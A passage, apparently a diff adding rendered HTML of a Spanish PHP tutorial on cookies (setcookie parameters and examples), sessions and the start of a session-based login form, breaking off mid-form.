+<span class="linenos" data-linenos="13 "></span>    <span class="nb">setcookie</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$name</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$options</span> <span class="o">=</span> <span class="p">[])</span><span class="o">:</span> <span class="nx">bool</span>
+<span class="linenos" data-linenos="14 "></span><span class="cp">?&gt;</span>
+</code></pre></div>
+<h4 id="parametros-de-setcookie">Parámetros de setcookie<a class="headerlink" href="#parametros-de-setcookie" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Tipo</th>
+<th>Descripción breve</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>name</code></strong></td>
+<td><code>string</code></td>
+<td>Nombre de la cookie. Es la clave que se usará para identificarla.</td>
+</tr>
+<tr>
+<td><strong><code>value</code></strong></td>
+<td><code>string</code></td>
+<td>Valor que almacenará la cookie. Si se omite, la cookie se elimina.</td>
+</tr>
+<tr>
+<td><strong><code>expires</code></strong></td>
+<td><code>int</code></td>
+<td>Marca de tiempo UNIX con la fecha de expiración. Si no se indica, la cookie expira al cerrar el navegador.</td>
+</tr>
+<tr>
+<td><strong><code>path</code></strong></td>
+<td><code>string</code></td>
+<td>Ruta del servidor donde la cookie estará disponible. Por defecto, en todo el dominio (<code>/</code>).  Si el valor es '/admin/', la cookie estará únicamente disponible en el directorio /admin/ y en sus subdirectorios.</td>
+</tr>
+<tr>
+<td><strong><code>domain</code></strong></td>
+<td><code>string</code></td>
+<td>Dominio para el cual es válida la cookie (por ejemplo, <code>midominio.com</code>).</td>
+</tr>
+<tr>
+<td><strong><code>secure</code></strong></td>
+<td><code>bool</code></td>
+<td>Si es <code>true</code>, la cookie solo se enviará por conexiones HTTPS.</td>
+</tr>
+<tr>
+<td><strong><code>httponly</code></strong></td>
+<td><code>bool</code></td>
+<td>Si es <code>true</code>, la cookie no será accesible desde JavaScript (<code>document.cookie</code>).</td>
+</tr>
+<tr>
+<td><strong><code>samesite</code></strong></td>
+<td><code>string</code></td>
+<td>Controla cuándo se envía la cookie en peticiones entre sitios. Valores: <code>"Strict"</code>, <code>"Lax"</code> o <code>"None"</code>.</td>
+</tr>
+<tr>
+<td><strong><code>options</code></strong></td>
+<td><code>array</code></td>
+<td>Desde PHP 7.3+, se pueden pasar los parámetros anteriores en un solo array asociativo.</td>
+</tr>
+</tbody>
+</table>
+<p>Destacar que el nombre no puede contener espacios ni el caracter <code>;</code>. Respecto al contenido de la cookie, no puede superar los 4 KB y lo que <strong>se guarda es una cadena de texto</strong>, aunque mediante las funciones <code>json_encode</code> y <code>json_decode</code> podríamos guardar y recurar un array convirtiéndolo a JSON.</p>
+<div class="admonition danger">
+<p class="admonition-title">Uso de setcookie()</p>
+<p>setcookie() define una cookie que será enviada junto con el resto de los encabezados HTTP. Al igual que con otros encabezados, las cookies deben ser enviadas antes de cualquier otra salida (esto es una restricción del protocolo HTTP, no de PHP): cualquier etiqueta <html> o <head> e incluso caracteres de espacio en blanco.</p>
+</div>
+<h4 id="ejemplos-de-uso-de-cookies">Ejemplos de uso de cookies<a class="headerlink" href="#ejemplos-de-uso-de-cookies" title="Permanent link">&para;</a></h4>
+<p>En los siguientes ejemplos se ilustra cómo mediante <em>cookies</em> se puede comprobar la cantidad de visitas diferentes que realiza un usuario a una página o cómo se almacena una carrito de productos:</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Accesos</label><label for="__tabbed_1_2">Accesos mejorado</label><label for="__tabbed_1_3">Almacenar array</label><label for="__tabbed_1_4">Explorando todas las opciones</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>Si existe la cookie con los accesos, la recuperamos, actualizamos y volvemos a almacenar.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span>    <span class="nv">$accesosPagina</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;accesos&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos="4 "></span>        <span class="nv">$accesosPagina</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;accesos&#39;</span><span class="p">];</span> <span class="c1">// recuperamos una cookie</span>
+<span class="linenos" data-linenos="5 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos="6 "></span>    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;accesos&#39;</span><span class="p">,</span> <span class="o">++</span><span class="nv">$accesosPagina</span><span class="p">);</span> <span class="c1">// le asignamos valor a la cookie (y si no existe, se crea)</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>Gracias al operador <code>??</code> se simplifica la comprobación de la cookie.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span>    <span class="nv">$accesosPagina</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;accesos&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="mi">0</span><span class="p">;</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;accesos&#39;</span><span class="p">,</span> <span class="o">++</span><span class="nv">$accesosPagina</span><span class="p">);</span> <span class="c1">// le asignamos valor a la cookie (y si no existe, se crea)</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>Si queremos guardar un array asociativo (o no) en una cookie, tendremos que convertirlo previamente a JSON medainte <code>json_encode</code> y al recuperarlo, realizar el proceso inverso mediante <code>json_decode</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;carrito&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 3 "></span>        <span class="nv">$carrito</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;carrito&#39;</span><span class="p">],</span> <span class="k">true</span><span class="p">);</span> <span class="c1">// true para que convierta a array asociativo en lugar de objeto Array</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 5 "></span>        <span class="nv">$carrito</span> <span class="o">=</span> <span class="p">[</span>
+<span class="linenos" data-linenos=" 6 "></span>            <span class="p">[</span>
+<span class="linenos" data-linenos=" 7 "></span>                <span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="mi">34</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 8 "></span>                <span class="s1">&#39;cantidad&#39;</span> <span class="o">=&gt;</span> <span class="mi">6</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 9 "></span>                <span class="s1">&#39;precio&#39;</span> <span class="o">=&gt;</span> <span class="mf">19.95</span>
+<span class="linenos" data-linenos="10 "></span>            <span class="p">],</span>
+<span class="linenos" data-linenos="11 "></span>            <span class="p">[</span>
+<span class="linenos" data-linenos="12 "></span>                <span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="mi">35</span><span class="p">,</span>
+<span class="linenos" data-linenos="13 "></span>                <span class="s1">&#39;cantidad&#39;</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
+<span class="linenos" data-linenos="14 "></span>                <span class="s1">&#39;precio&#39;</span> <span class="o">=&gt;</span> <span class="mf">9.95</span>
+<span class="linenos" data-linenos="15 "></span>            <span class="p">],</span>
+<span class="linenos" data-linenos="16 "></span>            <span class="p">[</span>
+<span class="linenos" data-linenos="17 "></span>                <span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="mi">36</span><span class="p">,</span>
+<span class="linenos" data-linenos="18 "></span>                <span class="s1">&#39;cantidad&#39;</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
+<span class="linenos" data-linenos="19 "></span>                <span class="s1">&#39;precio&#39;</span> <span class="o">=&gt;</span> <span class="mf">39.45</span>
+<span class="linenos" data-linenos="20 "></span>            <span class="p">],</span>
+<span class="linenos" data-linenos="21 "></span>        <span class="p">];</span>
+<span class="linenos" data-linenos="22 "></span>
+<span class="linenos" data-linenos="23 "></span>        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;carrito&#39;</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$carrito</span><span class="p">),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">);</span>
+<span class="linenos" data-linenos="24 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos="25 "></span>
+<span class="linenos" data-linenos="26 "></span>    <span class="c1">// Acceso</span>
+<span class="linenos" data-linenos="27 "></span>    <span class="k">echo</span> <span class="s2">&quot;Primer producto del carrito: &quot;</span><span class="o">.</span> <span class="nv">$carrito</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span><span class="c1">// Crear una cookie válida durante 1 hora</span>
+<span class="linenos" data-linenos=" 3 "></span><span class="nb">setcookie</span><span class="p">(</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="s2">&quot;usuario&quot;</span><span class="p">,</span>            <span class="c1">// nombre</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="s2">&quot;eladioblanco&quot;</span><span class="p">,</span>       <span class="c1">// valor</span>
+<span class="linenos" data-linenos=" 6 "></span>    <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">,</span>        <span class="c1">// expiración (1 hora desde ahora)</span>
+<span class="linenos" data-linenos=" 7 "></span>    <span class="s2">&quot;/&quot;</span><span class="p">,</span>                  <span class="c1">// ruta en la que está disponible</span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="s2">&quot;midominio.com&quot;</span><span class="p">,</span>      <span class="c1">// dominio</span>
+<span class="linenos" data-linenos=" 9 "></span>    <span class="k">true</span><span class="p">,</span>                 <span class="c1">// secure (solo HTTPS)</span>
+<span class="linenos" data-linenos="10 "></span>    <span class="k">true</span>                  <span class="c1">// httponly (no accesible por JS)</span>
+<span class="linenos" data-linenos="11 "></span><span class="p">);</span>
+<span class="linenos" data-linenos="12 "></span>
+<span class="linenos" data-linenos="13 "></span><span class="c1">// FIRMA a partir de PHP 7.3 (más legible y clara)</span>
+<span class="linenos" data-linenos="14 "></span><span class="nb">setcookie</span><span class="p">(</span>
+<span class="linenos" data-linenos="15 "></span>    <span class="s2">&quot;usuario&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos="16 "></span>    <span class="s2">&quot;eladioblanco&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos="17 "></span>    <span class="p">[</span>
+<span class="linenos" data-linenos="18 "></span>        <span class="s2">&quot;expires&quot;</span>  <span class="o">=&gt;</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">,</span>
+<span class="linenos" data-linenos="19 "></span>        <span class="s2">&quot;path&quot;</span>     <span class="o">=&gt;</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos="20 "></span>        <span class="s2">&quot;domain&quot;</span>   <span class="o">=&gt;</span> <span class="s2">&quot;midominio.com&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos="21 "></span>        <span class="s2">&quot;secure&quot;</span>   <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+<span class="linenos" data-linenos="22 "></span>        <span class="s2">&quot;httponly&quot;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+<span class="linenos" data-linenos="23 "></span>        <span class="s2">&quot;samesite&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;Strict&quot;</span>
+<span class="linenos" data-linenos="24 "></span>    <span class="p">]</span>
+<span class="linenos" data-linenos="25 "></span><span class="p">);</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Inspeccionando las cookies</p>
+<p>Si queremos ver qué contienen las cookies que tenemos almacenadas en el navegador, se puede comprobar su valor en <em>Dev Tools &rarr; Aplicación &rarr; Almacenamiento</em></p>
+</div>
+<p>El tiempo de vida de las cookies puede ser tan largo como el sitio web en el que residen. Ellas seguirán ahí, incluso si el navegador está cerrado o abierto.</p>
+<div class="admonition info">
+<p class="admonition-title">Tiempo en cookies</p>
+<p>El tiempo después del cual la cookie expira se mide en segundos desde la época Unix (1 de enero de 1970). Mediante la función <code>time()</code> obtenemos los sengundos que han pasado desde entonces y sumándole la cantidad que nos interese, estableceremos el tiempo futuro que tardará la cookie en expirar.</p>
+<p>Ejemplo: time() + 60 * 60 * 24 &rarr; La cookie expira en 1 día</p>
+</div>
+<p>Ejemplo de cookie que expira en 1 hora:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="nb">setcookie</span><span class="p">(</span><span class="nx">nombre</span><span class="p">,</span> <span class="nx">valor</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">)</span> <span class="c1">// Caducan dentro de una hora</span>
+</code></pre></div>
+<p>Para borrar una cookie se puede poner que expiren en el pasado:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="nb">setcookie</span><span class="p">(</span><span class="nx">nombre</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">// pasado</span>
+</code></pre></div>
+<p>La alternativa en el cliente para almacenar información en el navegador es el objeto <a href="https://developer.mozilla.org/es/docs/Web/API/Window/localStorage">LocalStorage</a>.</p>
+<h3 id="sesion">Sesión<a class="headerlink" href="#sesion" title="Permanent link">&para;</a></h3>
+<p>La sesión añade la gestión del estado a HTTP, <strong>almacenando la información en el servidor</strong>.
+Cada visitante tiene un ID de sesión único, el cual por defecto se almacena en una cookie denominada <code>PHPSESSID</code> que se crea una vez se inicia la sesión mediante <code>session_start()</code>.</p>
+<p>Si el cliente no tiene las cookies activas, el ID se propaga en cada URL dentro del mismo dominio.
+Cada sesión tiene asociado un almacén de datos mediante el array global <code>$_SESSION</code>, en el cual podemos almacenar y recuperar información.</p>
+<p>La sesión comienza al ejecutar un script PHP. Se genera un nuevo ID y se cargan los datos del almacén:</p>
+<figure style="align: center;">
+    <img src="imagenes/04/04sesion.png" width="700">
+    <figcaption>Comunicación con sesión</figcaption>
+</figure>
+
+<p>Las operaciones que podemos realizar con la sesión son:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span>    <span class="nb">session_start</span><span class="p">();</span> <span class="c1">// inicia o carga la sesión si ya existe</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="k">echo</span> <span class="nb">session_id</span><span class="p">();</span> <span class="c1">// devuelve el id de sesión (el que se envía como cookie al usuario)</span>
+<span class="linenos" data-linenos="4 "></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">clave</span><span class="p">]</span> <span class="o">=</span> <span class="nx">valor</span><span class="p">;</span> <span class="c1">// asignación</span>
+<span class="linenos" data-linenos="5 "></span>    <span class="nb">session_destroy</span><span class="p">();</span> <span class="c1">// destruye la sesión</span>
+<span class="linenos" data-linenos="6 "></span>    <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">clave</span><span class="p">]);</span> <span class="c1">// borrado de un dato de la sesión</span>
+<span class="linenos" data-linenos="7 "></span>    <span class="nb">session_unset</span><span class="p">();</span> <span class="c1">// borra todas las variables de la sesión</span>
+</code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Destruir la sesión y sus variables</p>
+<p>Al hacer <code>session_destroy()</code> se destruye toda la información asociada con la sesión actual, pero no destruye ninguna de las variables globales asociadas con la sesión, ni destruye la cookie de sesión. Para liberar todas las variables de la sesión, utilizar antes <code>session_unset()</code>.</p>
+</div>
+<h4 id="ejemplo-guardarrecuperar-en-sesion">Ejemplo guardar/recuperar en sesión<a class="headerlink" href="#ejemplo-guardarrecuperar-en-sesion" title="Permanent link">&para;</a></h4>
+<p>Vamos a ver mediante un ejemplo como podemos insertar en un página datos en la sesión para posteriormente en otra página acceder a esos datos. </p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">sesion1.php</label><label for="__tabbed_2_2">sesion2.php</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>En el archivo <code>sesion1.php</code> iniciamos la sesión almacenando en ella algún valor.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="x">    </span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span>        <span class="nb">session_start</span><span class="p">();</span> <span class="c1">// inicializamos</span>
+<span class="linenos" data-linenos="3 "></span>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;ies&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;IES Fernando III&quot;</span><span class="p">;</span> <span class="c1">// asignación</span>
+<span class="linenos" data-linenos="4 "></span>        <span class="nv">$instituto </span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;ies&quot;</span><span class="p">];</span> <span class="c1">// recuperación</span>
+<span class="linenos" data-linenos="5 "></span>
+<span class="linenos" data-linenos="6 "></span>        <span class="k">echo</span> <span class="s2">&quot;Estamos en el </span><span class="si">$instituto</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="7 "></span>    <span class="cp">?&gt;</span>
+<span class="linenos" data-linenos="8 "></span><span class="x">        &lt;br /&gt;</span>
+<span class="linenos" data-linenos="9 "></span><span class="x">        &lt;a href=&quot;sesion2.php&quot;&gt;Y luego&lt;/a&gt;</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>En el archivo <code>sesion2.php</code> iniciamos la sesión recuperando algún valor guardado.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span>    <span class="nb">session_start</span><span class="p">();</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="nv">$instituto </span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;ies&quot;</span><span class="p">];</span> <span class="c1">// recuperación</span>
+<span class="linenos" data-linenos="4 "></span>    <span class="k">echo</span> <span class="s2">&quot;Otra vez, en el </span><span class="si">$instituto</span><span class="s2">&quot;</span><span class="p">;</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+<h4 id="guardar-arrays-y-objetos-en-la-sesion">Guardar arrays y objetos en la sesión<a class="headerlink" href="#guardar-arrays-y-objetos-en-la-sesion" title="Permanent link">&para;</a></h4>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">Guardar en sesión</label><label for="__tabbed_3_2">Recuperar de sesión</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>Tanto arrays como objetos, se guardan en la sesión igual que cualquier otra variable o dato.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="nb">session_start</span><span class="p">();</span>
+<span class="linenos" data-linenos=" 3 "></span>    <span class="k">require_once</span> <span class="s2">&quot;User.php&quot;</span><span class="p">;</span> <span class="c1">// Cargar clase</span>
+<span class="linenos" data-linenos=" 4 "></span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="c1">// Crear objeto</span>
+<span class="linenos" data-linenos=" 6 "></span>    <span class="nv">$usuario</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&quot;Juan&quot;</span><span class="p">,</span> <span class="s2">&quot;juan@example.com&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos=" 7 "></span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="c1">// Guardar en sesión el objeto usuario</span>
+<span class="linenos" data-linenos=" 9 "></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$usuario</span><span class="p">;</span>
+<span class="linenos" data-linenos="10 "></span>
+<span class="linenos" data-linenos="11 "></span>    <span class="c1">// Guardar en sesión un array asociativo</span>
+<span class="linenos" data-linenos="12 "></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;preferencias&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
+<span class="linenos" data-linenos="13 "></span>        <span class="s1">&#39;tema&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;oscuro&#39;</span><span class="p">,</span>
+<span class="linenos" data-linenos="14 "></span>        <span class="s1">&#39;fuente&#39;</span> <span class="o">=&gt;</span> <span class="mi">12</span>
+<span class="linenos" data-linenos="15 "></span>    <span class="p">];</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>Recuperar un array es automático, igual que cualquier otra variable. En el caso de <strong>recuperar un objeto, es necesario incluir antes la definición de su clase</strong>.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="nb">session_start</span><span class="p">();</span>
+<span class="hll"><span class="linenos" data-linenos=" 3 "></span>    <span class="k">require_once</span> <span class="s2">&quot;User.php&quot;</span><span class="p">;</span> <span class="c1">// IMPORTANTE: Cargar clase antes de usarla</span>
+</span><span class="linenos" data-linenos=" 4 "></span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;preferencias&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 6 "></span>        <span class="nv">$usuario</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">];</span> <span class="c1">// Recuperar objeto</span>
+<span class="linenos" data-linenos=" 7 "></span>        <span class="nv">$preferencias</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;preferencias&#39;</span><span class="p">];</span> <span class="c1">// // Recuperar array</span>
+<span class="linenos" data-linenos=" 8 "></span>
+<span class="linenos" data-linenos=" 9 "></span>        <span class="k">echo</span> <span class="s2">&quot;&lt;p class=&#39;&quot;</span><span class="o">.</span> <span class="nv">$preferencias</span><span class="p">[</span><span class="s1">&#39;tema&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&gt;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="10 "></span>        <span class="k">echo</span> <span class="nv">$usuario</span><span class="o">-&gt;</span><span class="na">saludar</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot; - email: &quot;</span> <span class="o">.</span> <span class="nv">$usuario</span><span class="o">-&gt;</span><span class="na">email</span><span class="p">;</span>
+<span class="linenos" data-linenos="11 "></span>        <span class="k">echo</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="12 "></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="linenos" data-linenos="13 "></span>        <span class="k">echo</span> <span class="s2">&quot;No hay usuario o preferencias en la sesión.&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="14 "></span>    <span class="p">}</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Configurando la sesión en <code>php.ini</code></p>
+<p>Las siguiente propiedades de <code>php.ini</code> permiten configurar algunos aspectos de la sesión:</p>
+<ul>
+<li><code>session.save_handler</code>: controlador que gestiona cómo se almacena (<code>files</code>).</li>
+<li><code>session.save_path</code>: ruta donde se almacenan los archivos con los datos (si tenemos un cluster, podríamos usar <code>/mnt/sessions</code> en todos los servidor de manera que apuntan a una carpeta compartida).</li>
+<li><code>session.name</code>: nombre de la sesión (<code>PHPSESSID</code>).</li>
+<li><code>session.auto_start</code>: Se puede hacer que se autocargue con cada script. Por defecto está deshabilitado.</li>
+<li><code>session.cookie_lifetime</code>: tiempo de vida por defecto.</li>
+</ul>
+<p>Más información en la <a href="https://www.php.net/manual/es/session.configuration.php">documentación oficial</a>.</p>
+</div>
+<h2 id="45-autentificacion-de-usuarios">4.5 Autentificación de usuarios<a class="headerlink" href="#45-autentificacion-de-usuarios" title="Permanent link">&para;</a></h2>
+<h3 id="basada-en-sesiones">Basada en sesiones<a class="headerlink" href="#basada-en-sesiones" title="Permanent link">&para;</a></h3>
+<p>Una sesión establece una relación anónima con un usuario particular, de manera que podemos saber si es el mismo usuario entre dos peticiones distintas. Si preparamos un sistema de login, podremos saber quién utiliza nuestra aplicación.</p>
+<p>Para ello, preparemos un sencillo sistema de autenticación:</p>
+<ul>
+<li>Mostrar el formulario login/password</li>
+<li>Comprobar los datos enviados</li>
+<li>Añadir el login a la sesión</li>
+<li>Comprobar el login en la sesión para realizar tareas específicas del usuario</li>
+<li>Eliminar el login de la sesión cuando el usuario la cierra.</li>
+</ul>
+<p>Vamos a ver en código cada paso del proceso. Comenzamos con el archivo <code>index.php</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#39;login.php&#39;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#39;post&#39;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 2 "></span>  <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 3 "></span>    <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>Login<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;error&#39;</span><span class="p">&gt;</span><span class="cp">&lt;?= $error ?? &quot;&quot; ?&gt;</span><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;fila&#39;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 6 "></span>        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#39;usuario&#39;</span><span class="p">&gt;</span>Usuario:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos=" 7 "></span>        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text&#39;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;inputUsuario&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;usuario&#39;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;50&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 9 "></span>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;fila&#39;</span><span class="p">&gt;</span>
